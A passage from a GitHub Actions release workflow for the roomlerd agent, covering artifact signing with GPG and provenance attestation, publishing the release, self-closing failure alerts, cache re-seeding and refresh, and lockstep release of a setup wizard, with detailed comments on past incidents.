        if: steps.apple.outputs.mode != 'full'
        run: echo "::warning::Apple signing credentials absent — the .pkg is unsigned and unnotarised, and Gatekeeper will block it on every end-user Mac. Artifacts-only run, so not fatal."

      - name: SHA256 checksum
        run: shasum -a 256 "${{ steps.pkg.outputs.artifact }}" > "${{ steps.pkg.outputs.artifact }}.sha256"

      - name: Cleanup keychain
        if: always()
        run: security delete-keychain build.keychain || true

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: macos-pkg
          path: |
            ${{ steps.pkg.outputs.artifact }}
            ${{ steps.pkg.outputs.artifact }}.sha256
          retention-days: 30

      - name: Save cargo seed (new lockfile generation)
        # always(): preserves cache-on-failure semantics -- a rehearsal
        # that builds and then dies later must still seed (the 07-28
        # incident). Non-tag only: tag-ref saves are unrestorable dead
        # weight. A same-lockfile twin save loses the reservation and
        # warns -- harmless.
        if: always() && github.ref_type != 'tag'
        continue-on-error: true
        uses: ./.github/actions/seed-cache-save
        # GH_TOKEN powers the action's generation-retirement step (keeps
        # the 2 newest generations of this family, deletes the rest) —
        # without it, generations piled to 9.5 GB in a day and LRU evicted
        # the CI lane's caches instead (run 32198738776).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-macos

  # ---------------------------------------------------------------------------
  # 4. Publish — only on tag push (or dispatch with publish_release=true).
  # ---------------------------------------------------------------------------
  release:
    name: Publish GitHub Release
    if: needs.validate-version.outputs.is_release == 'true'
    needs: [validate-version, build-linux, build-linux-companion, build-linux-companion-arm64, build-linux-arm64, build-windows, build-windows-companions, build-macos-companion, build-macos]
    runs-on: ubuntu-latest
    permissions:
      contents: write      # create the release
      id-token: write      # sigstore identity for the provenance attestation
      attestations: write  # actions/attest-build-provenance
    steps:
      - uses: actions/checkout@v4

      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: dist

      - name: Flatten artifact tree
        run: |
          mkdir -p release
          # rc.18: include `.exe` so the desktop companion EXE makes
          # the GitHub Release alongside the agent MSI/.pkg/.deb.
          # `windows-msi` carries the two agent MSIs; `windows-companions`
          # carries the desktop EXE; flatten is extension-based
          # so both artifact dirs (+ all .sha256 files) land unchanged.
          # `.tar.gz` is the universal Linux installer (docs/linux-self-update.md);
          # it must be listed here or the artifact is silently dropped from the
          # Release and every non-Debian host keeps skipping its updates.
          # `.rpm` is the companion's for those hosts (FR-93 P6d), and the same
          # silent drop applies to it.
          find dist -type f \( -name '*.msi' -o -name '*.pkg' -o -name '*.deb' -o -name '*.rpm' -o -name '*.exe' -o -name '*.tar.gz' -o -name '*.sha256' \) \
            -exec mv {} release/ \;
          ls -la release/

      # Detached .asc signatures over every asset. What this actually buys
      # (and what it doesn't): dpkg -i does NOT verify signatures and apt
      # verifies a repo's InRelease, not per-package sigs -- so this is NOT
      # apt-level trust. It is an integrity check a human or a script can run
      # that does not depend on GitHub being honest, which is exactly the gap
      # the .sha256 sidecars leave (they are served by the same host they
      # attest). Key setup: scripts/signing/70-gpg-release-key.sh.
      #
      # ⚠️ These sidecars stopped being optional at rc.476. `updater.rs`
      # REQUIRES a verifying `.asc` on Linux/macOS, so a tag published without
      # them does not degrade — it freezes every Linux and macOS agent in the
      # fleet on its current version, silently, until someone notices the
      # updates stopped. Skipping with a notice was right while nothing
      # consumed them and is a fleet outage now.
      #
      # So: absent key is still a graceful skip on a BRANCH dispatch (that is
      # how the pipeline is rehearsed without secrets), and a hard FAILURE on a
      # tag. Same shape as the Windows lane's `require` gate, and for the same
      # reason — a release that would ship unsigned must fail loudly at build
      # time, not quietly at 20 devices' update checks.
      - name: GPG-sign release artifacts
        env:
          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
          GPG_PASSPHRASE:  ${{ secrets.GPG_PASSPHRASE }}
        run: |
          set -euo pipefail
          if [ -z "${GPG_PRIVATE_KEY:-}" ]; then
            if [ "${{ github.ref_type }}" = "tag" ]; then
              echo "::error::GPG_PRIVATE_KEY is not configured, but this is a release tag."
              echo "::error::Publishing without .asc sidecars would freeze every Linux/macOS"
              echo "::error::agent: updater.rs requires a verifying signature since rc.476."
              exit 1
            fi
            echo "::notice::GPG_PRIVATE_KEY not configured -- publishing without .asc signatures (not a tag)."
            exit 0
          fi
          echo "$GPG_PRIVATE_KEY" | gpg --batch --import
          for f in release/*; do
            case "$f" in *.asc|*.sha256) continue ;; esac
            gpg --batch --yes --pinentry-mode loopback --passphrase "$GPG_PASSPHRASE" \
                --armor --detach-sign "$f"
            echo "signed: $f"
          done
          # Republish the public key alongside the assets so verification
          # never depends on a checkout of this repo.
          gpg --batch --armor --export > release/roomler-release-pubkey.asc

          # Assert the loop actually produced sidecars. `set -e` covers a gpg
          # that FAILS, but not the case that matters here — a `release/` whose
          # installers arrived under an unexpected name, or a glob that matched
          # nothing, leaves the step green with zero signatures and the freeze
          # lands on the fleet instead. Count what the updater will look for.
          missing=0
          for f in release/*.deb release/*.rpm release/*.pkg release/*.msi; do
            [ -e "$f" ] || continue
            if [ ! -e "$f.asc" ]; then
              echo "::error::no signature produced for $f"
              missing=$((missing + 1))
            fi
          done
          signed=$(ls release/*.asc 2>/dev/null | grep -vc 'roomler-release-pubkey' || true)
          echo "signed $signed asset(s); $missing installer(s) unsigned"
          if [ "$missing" -gt 0 ] || [ "$signed" -eq 0 ]; then
            echo "::error::refusing to publish a release the fleet would refuse to install."
            exit 1
          fi

      # SLSA build provenance for EVERY asset (all platforms in one step) --
      # ties each artifact to this exact workflow run + commit, verifiable
      # with `gh attestation verify <file> --repo gjovanov/roomler-ai`
      # independently of GitHub's per-asset digest field.
      - name: Attest build provenance
        uses: actions/attest-build-provenance@v3
        with:
          subject-path: 'release/*'

      - name: Create release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ needs.validate-version.outputs.tag }}
          name: roomlerd ${{ needs.validate-version.outputs.version }}
          # prerelease must stay false so GitHub's /releases/latest API
          # returns this release — the agent's built-in auto-updater
          # polls that endpoint every 6 h. Marking 0.x as prerelease
          # (the previous policy) caused every release to be invisible
          # to /releases/latest, which 404'd and broke self-update for
          # every 0.1.36 agent in the field.
          prerelease: false
          generate_release_notes: true
          files: release/*

  # ---------------------------------------------------------------------------
  # 5. Seed-failure alert — fires ONLY for non-release runs (the weekly
  #    cron + seed-release-caches.yml dispatches). A failed seed rehearsal
  #    used to be doubly silent: nobody watches artifacts-only runs, and
  #    the failed job saved no caches, so the release lane quietly went
  #    cold until someone noticed the slow builds. Exactly that happened
  #    2026-07-28→30: the dispatcher fired on a release-agent.yml change,
  #    its rehearsal died on LGHT0368 (broken mid-day wxs state), the wxs
  #    FIX commit touched only wix/ so nothing re-dispatched, and
  #    rc.266→277 all built cold (~23 min vs ~9). cache-on-failure above
  #    fixes the wasted-compile half; this job fixes the nobody-noticed
  #    half. Tag-run failures stay out — those are already loud.
  # ---------------------------------------------------------------------------
  seed-failure-alert:
    name: Alert on failed seed rehearsal
    if: >-
      always() &&
      needs.validate-version.outputs.is_release == 'false' &&
      (needs.build-linux.result == 'failure' ||
       needs.build-linux-companion.result == 'failure' ||
       needs.build-linux-companion-arm64.result == 'failure' ||
       needs.build-linux-arm64.result == 'failure' ||
       needs.build-windows.result == 'failure' ||
       needs.build-windows-companions.result == 'failure' ||
       needs.build-macos-companion.result == 'failure' ||
       needs.build-macos.result == 'failure')
    needs: [validate-version, build-linux, build-linux-companion, build-linux-companion-arm64, build-linux-arm64, build-windows, build-windows-companions, build-macos-companion, build-macos]
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      # One issue per CONDITION, not one per occurrence. This step used to call
      # `gh issue create` unconditionally, so every failed rehearsal opened a new
      # issue and nothing ever closed one: by 2026-08-30 there were TEN open,
      # dating back to 08-15, all describing a lane that had been green for eight
      # consecutive runs. An alert nobody can close is one nobody reads, and the
      # count stops meaning anything — which is worse than no alert, because the
      # backlog looks like a standing problem.
      #
      # So: reuse the open issue if there is one, and let the success path below
      # close it. `--search` is scoped `in:title` against the fixed prefix, which
      # is why the date lives at the END of the title.
      - name: File or update the alert issue
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          run_url="${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
          existing=$(gh issue list --repo "${{ github.repository }}" --state open \
            --search 'in:title "Seed rehearsal failed"' --limit 1 --json number --jq '.[0].number // empty')

          if [ -n "$existing" ]; then
            echo "reusing open alert #$existing"
            gh issue comment "$existing" --repo "${{ github.repository }}" \
              --body "$(printf 'Rehearsal failed again on %s: %s\n\nStill unresolved — the caches remain unrefreshed. This issue closes automatically when a rehearsal succeeds.\n' "$(date -u +%F)" "$run_url")"
          else
            gh issue create --repo "${{ github.repository }}" \
              --title "Seed rehearsal failed — release-lane caches NOT refreshed ($(date -u +%F))" \
              --body "$(printf 'The artifacts-only release-agent rehearsal (weekly cron or seed-release-caches.yml dispatch) failed: %s\n\nUntil a rehearsal succeeds on master, agent tag builds run with cold cargo caches (~+14 min on the Windows MSI job). cache-on-failure means partial seeds may still have been saved, but the failure itself needs fixing.\n\nThis issue is reused by later failures and CLOSED automatically by the next successful rehearsal, so an open one always means "currently broken".\n\nRe-run after fixing:\n\n    gh workflow run release-agent.yml --ref master -f version=<workspace version> -f publish_release=false\n' "$run_url")"
          fi


  # ---------------------------------------------------------------------------
  # 5b. Seed rehearsal RECOVERED — close the alert. Without this the alert above
  #     is write-only: it can open an issue but never retract one, so an open
  #     issue proves only that the lane broke ONCE, at some point, possibly weeks
  #     ago and long since fixed. That is exactly what happened — ten open
  #     issues on 2026-08-30 against eight consecutive green runs.
  #
  #     Pairing open with close is what makes the signal readable: an open alert
  #     now means "the lane is broken RIGHT NOW", which is the only version of it
  #     worth paging on.
  #
  #     Same `is_release == 'false'` guard as the alert, so tag builds never
  #     touch it; tag failures are loud on their own.
  # ---------------------------------------------------------------------------
  seed-recovery-close:
    name: Close the seed alert on a green rehearsal
    if: >-
      always() &&
      needs.validate-version.outputs.is_release == 'false' &&
      needs.build-linux.result == 'success' &&
      needs.build-linux-companion.result == 'success' &&
      needs.build-linux-companion-arm64.result == 'success' &&
      needs.build-linux-arm64.result == 'success' &&
      needs.build-windows.result == 'success' &&
      needs.build-windows-companions.result == 'success' &&
      needs.build-macos-companion.result == 'success' &&
      needs.build-macos.result == 'success'
    needs: [validate-version, build-linux, build-linux-companion, build-linux-companion-arm64, build-linux-arm64, build-windows, build-windows-companions, build-macos-companion, build-macos]
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - name: Close any open seed-rehearsal alert
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          run_url="${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
          # Every open alert, not just the newest: the pre-dedup ones accumulated
          # and a single-issue close would leave the rest standing forever.
          nums=$(gh issue list --repo "${{ github.repository }}" --state open \
            --search 'in:title "Seed rehearsal failed"' --limit 50 --json number --jq '.[].number')
          if [ -z "$nums" ]; then
            echo "no open seed alert — nothing to close"
            exit 0
          fi
          for n in $nums; do
            echo "closing #$n"
            gh issue close "$n" --repo "${{ github.repository }}" --reason completed \
              --comment "$(printf 'Rehearsal succeeded on %s: %s\n\nThe release-lane caches are refreshed, so the condition this issue reports no longer holds. Closed automatically; it reopens as a new issue if a later rehearsal fails.\n' "$(date -u +%F)" "$run_url")"
          done

  # ---------------------------------------------------------------------------
  # 6. Post-release re-seed — after every successful TAG release, dispatch
  #    the artifacts-only rehearsal so the master-ref seed (a) always
  #    matches the just-released Cargo.lock exactly and (b) is always the
  #    NEWEST cache in the repo pool, which LRU eviction therefore never
  #    touches ahead of the PR/CI churn. Together with the weekly cron,
  #    the toolchain/workflow-change dispatcher, cache-on-failure, and
  #    the seed-failure alert, every observed way the lane has gone cold
  #    (failed seed 07-28, env-hash rotation 07-23 + 08-01, pool eviction
  #    07-30) is now covered by an automatic re-seed within one cycle.
  #    Recursion-safe: rehearsals run with is_release=false, so they
  #    never trigger this job.
  # ---------------------------------------------------------------------------
  reseed:
    name: Re-seed master caches (post-release)
    if: needs.validate-version.outputs.is_release == 'true'
    needs: [validate-version, release]
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      actions: write
      contents: read
    steps:
      - uses: actions/checkout@v4
        with:
          ref: master

      - name: Dispatch artifacts-only rehearsal
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          # Read the version from MASTER (not the tag) — if another bump
          # already landed, the rehearsal should build that state; if the
          # version races mid-dispatch, validate-version fails loudly in
          # ~30 s and the next release's reseed (or the cron) covers it.
          version=$(awk '
            /^\[workspace\.package\]/ {in_section=1; next}
            /^\[/ {in_section=0}
            in_section && /^version[[:space:]]*=/ {
              gsub(/"/, "", $3)
              print $3
              exit
            }
          ' Cargo.toml)
          echo "Dispatching post-release seed rehearsal for ${version}"
          gh workflow run release-agent.yml --ref master \
            -f version="${version}" -f publish_release=false

  # ---------------------------------------------------------------------------
  # 7. Bust the roomler.ai release cache.
  #
  #    `/api/{agent,tunnel,setup}/latest-release` is served from a per-pod,
  #    in-process cache, so without this step a freshly published tag stays
  #    invisible to the fleet for up to one TTL — and, with more than one pod,
  #    non-deterministically so (which answer you get depends on which pod the
  #    LB picked). Field repro 2026-08-04: agent-v0.3.0-rc.305 published 21:14
  #    UTC, `roomlerd self-update` still reported rc.304 at 21:33 because both
  #    pods had warmed their caches at 21:05.
  #
  #    One POST busts the whole cluster: the receiving pod refetches and fans
  #    the same request out to every live peer over the C-1 control bus.
  #    `expect_tag` makes the call meaningful rather than advisory — a pod only
  #    reports ok once it can actually SEE the tag we just published (GitHub's
  #    releases LIST endpoint trails release creation by a few seconds).
  #
  #    Deliberately non-blocking: the 15-minute cache TTL is the backstop, and
  #    a transient prod blip must not mark an already-shipped release failed.
  # ---------------------------------------------------------------------------
  refresh-release-cache:
    name: Refresh roomler.ai release cache
    if: needs.validate-version.outputs.is_release == 'true'
    needs: [validate-version, release]
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: POST /api/releases/refresh
        env:
          TOKEN: ${{ secrets.ROOMLER_RELEASE_REFRESH_TOKEN }}
          TAG: ${{ needs.validate-version.outputs.tag }}
        run: |
          set -uo pipefail
          if [ -z "${TOKEN}" ]; then
            echo "::notice::ROOMLER_RELEASE_REFRESH_TOKEN unset (fork?); skipping cache refresh"
            exit 0
          fi
          for attempt in 1 2 3; do
            body=$(curl -sS -m 90 -X POST \
              -H "Authorization: Bearer ${TOKEN}" \
              "https://roomler.ai/api/releases/refresh?expect_tag=${TAG}")
            if [ "$(jq -r '.all_ok' <<<"$body" 2>/dev/null)" = "true" ]; then
              jq . <<<"$body"
              echo "Release cache refreshed on every live pod for ${TAG}"
              exit 0
            fi
            echo "attempt ${attempt}: ${body:-<no response>}"
            sleep 10
          done
          echo "::warning::release cache refresh did not confirm on every pod for ${TAG}; the cache TTL will heal it within 15 min"

      # FR-27 — assert what actually broke, against the endpoint that broke it.
      #
      # Every Linux updater up to 0.4.15 picks its own package with
      #   assets.iter().find(|a| name.ends_with(".deb") && name.contains(arch))
      # and reads THIS feed. On 2026-08-29 the newly-added
      # `roomler-desktop-*.deb` came back first, so mars and jupiter
      # apt-installed the companion as their own daemon update: "package
      # installed", version unchanged, no error, 34 packages of webkit onto a
      # headless cluster node. `agent_release::order_assets_daemon_first` fixes
      # it server-side (the only place that can reach an already-frozen agent),
      # and this replays the broken picker against the live payload so a
      # regression in that ordering is caught by the release that would ship it
      # rather than by a fleet that stops updating in silence.
      #
      # A warning, not a failure: by this point the release is published and
      # the assets are immutable, so failing the job would signal nothing a
      # human could act on differently — but the line has to be loud.
      - name: Guard — the daemon .deb still wins the pre-0.4.16 picker
        run: |
          set -uo pipefail
          feed=$(curl -sS -m 60 https://roomler.ai/api/agent/latest-release) || {
            echo "::warning::could not read the release feed; ordering unverified"; exit 0; }
          for arch in x86_64 aarch64; do
            # `endswith`/`contains`, not a regex — the picker being replayed
            # does exactly that, and it keeps backslashes out of a shell string
            # inside a YAML block scalar (three quoting layers, one of which
            # silently ate the escape the first time this was written).
            first=$(jq -r --arg a "$arch" '
              [ .[0].assets[]?.name
                | select(endswith(".deb"))
                | select(contains($a)) ] | first // ""' <<<"$feed")
            echo "$arch -> ${first:-<no .deb>}"
            # FR-46: match the COMPANION, not an allowlist of daemon prefixes. The
            # old form (`""|roomler-agent-*`) hard-coded the daemon asset name, so
            # renaming that asset silently turned this guard into a permanent
            # warning — a stale allowlist that fires on the correct state. What
            # `order_assets_daemon_first` actually asserts server-side is a
            # `roomler-desktop-` DENYLIST, so replay exactly that and the guard
            # survives any future daemon rename.
            case "$first" in
              roomler-desktop-*) echo "::warning::a pre-0.4.16 $arch agent would install '$first' as its daemon update — the companion must sort AFTER the daemon in /api/agent/latest-release (agent_release::order_assets_daemon_first)" ;;
              *) ;;
            esac
          done

  # ---------------------------------------------------------------------------
  # 8. FR-84 S1 — the setup wizard releases in LOCKSTEP with the agent.
  #
  #    `/api/setup/{windows,linux,macos}` serve the newest `setup-v*` release
  #    (setup_release.rs::pick_release_for). Nothing cut one between
  #    setup-v0.4.48 (2026-09-02) and agent-v0.4.102: the landing page's
  #    download button served a wizard 54 agent releases old, with no macOS
  #    asset at all, and nothing said so. A release lane a human has to
  #    remember is a release lane that drifts — so every agent release tags
  #    `setup-v<V>` at the SAME commit and runs release-setup.yml on it.
  #
  #    Two GitHub rules shape the mechanics:
  #      - a tag pushed with GITHUB_TOKEN triggers NO workflow (by design,
  #        against recursion) — the tag push alone would publish nothing;
  #      - `workflow_dispatch` is the documented exception — so the job
  #        dispatches release-setup.yml explicitly, ON THE TAG REF, which is
  #        also how that lane's validate-version sees ref_type == tag and can
  #        assert the ref matches the version it was handed.
  #    The tag is created idempotently: present at the same commit → reused
  #    (a re-run after a transient dispatch failure must not trip over its
  #    own earlier success); present at a DIFFERENT commit → refuse loudly.
  #    A wizard is never re-cut under a number that already shipped: the
  #    resolver serves by number, so the bytes behind one download URL would
  #    change underneath everyone who already fetched them.
  #
  #    Ordered AFTER `release`, so the wizard can never block or poison the
  #    agent release. A failure here goes red with the manual recovery in
  #    the log, and release-setup.yml's own failure alert opens an issue if
  #    the dispatched run fails. Kill switch: repo variable
  #    SETUP_LOCKSTEP=false skips the job.
  # ---------------------------------------------------------------------------
  dispatch-setup-release:
    name: Release the setup wizard in lockstep
    if: needs.validate-version.outputs.is_release == 'true' && vars.SETUP_LOCKSTEP != 'false'
    needs: [validate-version, release]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write   # push the setup-v<V> tag
      actions: write    # dispatch release-setup.yml
    steps:
      - uses: actions/checkout@v4

      - name: Tag setup-v<V> at the released commit and dispatch release-setup.yml
        env:
          GH_TOKEN: ${{ github.token }}
          VERSION: ${{ needs.validate-version.outputs.version }}
          AGENT_TAG: ${{ needs.validate-version.outputs.tag }}
        run: |
          set -euo pipefail
          setup_tag="setup-v${VERSION}"
          # The commit the agent release was BUILT from, read from the
          # checkout rather than GITHUB_SHA: on an ANNOTATED tag push
          # GITHUB_SHA is the tag object, not the commit (agent-v0.4.102 was
          # annotated, 0.4.101 was not — both must produce a commit here).
          commit=$(git rev-parse 'HEAD^{commit}')
          echo "agent release ${AGENT_TAG} built from ${commit} (GITHUB_SHA=${GITHUB_SHA})"

          refused=0
          recover() {
            if [ "$refused" -eq 1 ]; then return; fi
            echo "::error::${setup_tag} was NOT released in lockstep with ${AGENT_TAG} — /api/setup serves the previous wizard until one of these runs:"
            echo "::error::  gh workflow run release-setup.yml --ref ${setup_tag} -f version=${VERSION} -f publish_release=true    # once ${setup_tag} exists at ${commit}"
            echo "::error::  git push origin ${commit}:refs/tags/${setup_tag}    # a tag pushed with a HUMAN token triggers release-setup.yml by itself"
          }
          trap 'rc=$?; [ "$rc" -eq 0 ] || recover' EXIT

          # Idempotent tag: reuse it at the same commit, refuse it at another.
          if git fetch --quiet origin "refs/tags/${setup_tag}:refs/tags/${setup_tag}" 2>/dev/null; then
            at=$(git rev-parse "${setup_tag}^{commit}")
            if [ "$at" != "$commit" ]; then
              refused=1
              echo "::error::${setup_tag} already exists at ${at}, not at ${commit} — a wizard release is never re-cut under a number that already shipped; bump the version and release again"
              exit 1
            fi
            echo "${setup_tag} already exists at ${commit} — reusing it"
          else
            git tag "${setup_tag}" "${commit}"
            git push origin "refs/tags/${setup_tag}"
            echo "pushed ${setup_tag} at ${commit} (a GITHUB_TOKEN tag push triggers no workflow — dispatching explicitly)"
          fi

          gh workflow run release-setup.yml --ref "${setup_tag}" \
            -f version="${VERSION}" -f publish_release=true
          echo "dispatched release-setup.yml on ${setup_tag}: it builds all three platforms, publishes the release on the tag (which pins ${commit}), refreshes the roomler.ai cache, and opens an issue if it fails"
          echo "verify: git ls-remote origin 'refs/tags/${setup_tag}^{}' (must be ${commit}) ; gh release view ${setup_tag} --json assets ; curl -sI https://roomler.ai/api/setup/windows | grep -i content-disposition"
# RETIRED-NAME-ANCHOR-END
